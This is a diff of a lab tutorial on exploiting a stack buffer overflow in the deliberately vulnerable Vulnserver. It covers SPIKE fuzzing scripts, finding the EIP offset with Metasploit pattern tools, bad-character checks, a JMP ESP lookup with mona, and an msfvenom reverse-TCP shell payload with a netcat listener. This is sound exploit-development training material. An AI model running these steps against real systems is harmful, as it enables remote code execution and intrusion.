@@ -28,7 +28,7 @@ We need a Windows system including the Vulnserver ([http://sites.google.com/site
 
 · Start a connection to the server and run some commands to understand how it works:
 
-           <!-- nc -nv \[IPWINDOWS\] 9999 -->  
+           nc -nv \[IPWINDOWS\] 9999  
 
 #In the answer the server indicates the use of HELP to get additional info.
 
@@ -36,13 +36,10 @@ We need a Windows system including the Vulnserver ([http://sites.google.com/site
 
 · Create a SPIKE script to send the commands with fuzzed data. It is simple as if we understand what information should be sent always and what we can manipulate, the resulting script is like this:
 
-_printf__("HELP 0help.spk : "); //print to terminal command and filename_
-
-_s\_readline__(); //print received line from server_
-
-_s\_string__("HELP "); // send "HELP " **command** to the program. Requires a space as the fuzz will go after it_
-
-_s\_string\_variable__("INJECTION\_POINT"); //send fuzzed string. At the end, the resulting string sent to the server is HELP INJECTION\_POINT_
+           _printf__("HELP 0help.spk : "); //print to terminal command and filename_
+           _s\_readline__(); //print received line from server_
+           _s\_string__("HELP "); // send "HELP " **command** to the program. Requires a space as the fuzz will go after it_
+           _s\_string\_variable__("INJECTION\_POINT"); //send fuzzed string. At the end, the resulting string sent to the server is HELP INJECTION\_POINT_
 
 #Create a spk file for each commands supported by the server: STATS, RTIME, etc. Assign a sequence number to the filename so when it is restarted, it could continue from the last tested and not from the beginning.
 
@@ -50,7 +47,7 @@ _s\_string\_variable__("INJECTION\_POINT"); //send fuzzed string. At the end, th
 
 · Run the SPIKE script to look for overflows:
 
-generic\_send\_tcp \[ip\] \[port\] \[script.spk\] 0 0
+           generic\_send\_tcp \[ip\] \[port\] \[script.spk\] 0 0
 
 Spike send a predeterminate list of strings each time replacing the string variable "INJECTION\_POINT" by predetermined injection chars already preconfigured in spike by default. The 0 indicates where to start from the predetermined file and where to stop. To run all by default use 0 0
 
@@ -62,9 +59,11 @@ You can create a shell / wrapper file to call the generic\_send\_tcp with each s
 
 · I used a perl script called fuzzingall.pl copied from the article but it can be a .sh file
 
-· Run it: ./fuzzingall.pl \[ip\] \[port\] 0 0 0
+· Run it: 
+           ./fuzzingall.pl \[ip\] \[port\] 0 0 0
 
-· To start in any specific (6): ./fuzzingall.pl \[ip\] \[port\] 6 0 0
+· To start in any specific (6): 
+           ./fuzzingall.pl \[ip\] \[port\] 6 0 0
 
 · **Identify what is causing the crash**
 
@@ -82,12 +81,11 @@ We need to identify what information is stored in each register at the crash mom
 
 Identify the exact size of the buffer where the program crashes by creating an special string with metasploit framework pattern\_create (locate pattern\_create). In my case I had to run it in this way:
 
-/opt/metasploit\-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern\_create.rb -l 5000
+           /opt/metasploit\-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern\_create.rb -l 5000
 
-In other Kali: msf-pattern\_create -l \[LENGHT\]
-
-msf-pattern\_create -l \[LENGTH\]
-
+In other Kali: 
+           msf-pattern\_create -l \[LENGHT\]
+           
 #This can also be generated using mona.py in Immunity Debugger but I will not show here the details.
 
 #Phase 3 of the python script help us to identify this task.
@@ -96,11 +94,9 @@ Restart the vulnserver in windows from the debugger (ctrl-F2) and run the python
 
 Calculate the offset for this EIP value using
 
-/opt/metasploit\-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern\_offset.rb -l \[length\] -q **386F4337**
-
-In oother kali: msf-pattern\_offset -l \[length\] -q 386F4337
-
-\=> \[\*\] Exact match at offset 2003
+           /opt/metasploit\-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern\_offset.rb -l \[length\] -q **386F4337**
+           \#In other kali: msf-pattern\_offset -l \[length\] -q 386F4337
+           \=> \[\*\] Exact match at offset 2003
 
 Confirm the EIP can be manipulated by us:
 
@@ -110,7 +106,7 @@ Using the Part 3 of the python we can select the value we want to left in the EI
 
 Part 4 of the script checks if the application has some "bad characters".
 
-After running the exploit, observe the ESP value (right pane) and the stack (right down) to validate all the "badchars" sent were included. They should be observed as a sequence (04030201 ). We can also observe the details in the down-left side by right-clicking the ESP or stack and selecting follow in dump to see it better. If there are some bad chars, then the hexa value will not be showed in the sequence. We need to remove it from the badchars string and run it again. In this way we can identify and remove all bad chars.
+After running the exploit, observe the ESP value (right pane) and the stack (right down) to validate all the "badchars" sent were included. They should be observed as a sequence (04030201 ...). We can also observe the details in the down-left side by right-clicking the ESP or stack and selecting follow in dump to see it better. If there are some bad chars, then the hexa value will not be showed in the sequence. We need to remove it from the badchars string and run it again. In this way we can identify and remove all bad chars.
 
 ![](BoF_files/image002.jpg)
 
@@ -136,17 +132,12 @@ To run mona, in Immunity Debugger run the command in the textbox in the downside
 
 \# To know the op codefor JUMP ESP we can use msf-nasm\_shell. Run it and put JMP ESP to identify the op code
 
-msf-nasm\_shell
-
-\>JMP ESP
-
-In other Kali is: /opt/metasploit\-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/nasm\_shell.rb
-
-We got "FFE4"
-
-\# Now we need to look for the instruction JMP ESP ("\\xff\\xe4") in the memory for any of these unprotected modules
-
-!mona find -s "\\xff\\xe4" -m "essfunc.dll" => -s is the byte string to search for, -m specifies the module to search in
+           msf-nasm\_shell
+           \>JMP ESP
+           \#In other Kali is: /opt/metasploit\-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/nasm\_shell.rb
+           \#We got "FFE4"
+           \# Now we need to look for the instruction JMP ESP ("\\xff\\xe4") in the memory for any of these unprotected modules
+           !mona find -s "\\xff\\xe4" -m "essfunc.dll" => -s is the byte string to search for, -m specifies the module to search in
 
 #9 occurrences were found.
 
@@ -160,15 +151,15 @@ In this case, we need to put this address (625011AF) in the EIP so the program w
 
 In a terminal window in Linux run the listener to receive the reverse shell:
 
-nc -nvpl 443
+           nc -nvpl 443
 
 Now let's prepare the shell. This shellcode should not contain bad chars (if we found any)
 
-Using msvenom in Linux, we can create it without the previously identified badchars. At least \\x00 (null) should be included. -f specifies the language (c, py, pl, )
+Using msvenom in Linux, we can create it without the previously identified badchars. At least \\x00 (null) should be included. -f specifies the language (c, py, pl, ...)
 
 The EXITFUNC=Thread is used to avoid the program to terminate when we finish the shell. This will close only the thread used by the shell.
 
-msfvenom -p windows/shell\_reverse\_tcp LHOST=\[IP KALI\] LPORT=443 EXITFUNC= thread -f py -e x86/shikata\_ga\_nai -b "\\x00"
+           msfvenom -p windows/shell\_reverse\_tcp LHOST=\[IP KALI\] LPORT=443 EXITFUNC= thread -f py -e x86/shikata\_ga\_nai -b "\\x00"
 
 Now we have all the pieces we need:
 
@@ -186,6 +177,6 @@ To be sure the shell is loaded in the ESP, we can create a breakpoint in the add
 
 ![](BoF_files/image006.jpg)
 
-After running it we got the shell ..
+After running it we got the shell ...
 
 ![](BoF_files/image008.jpg)
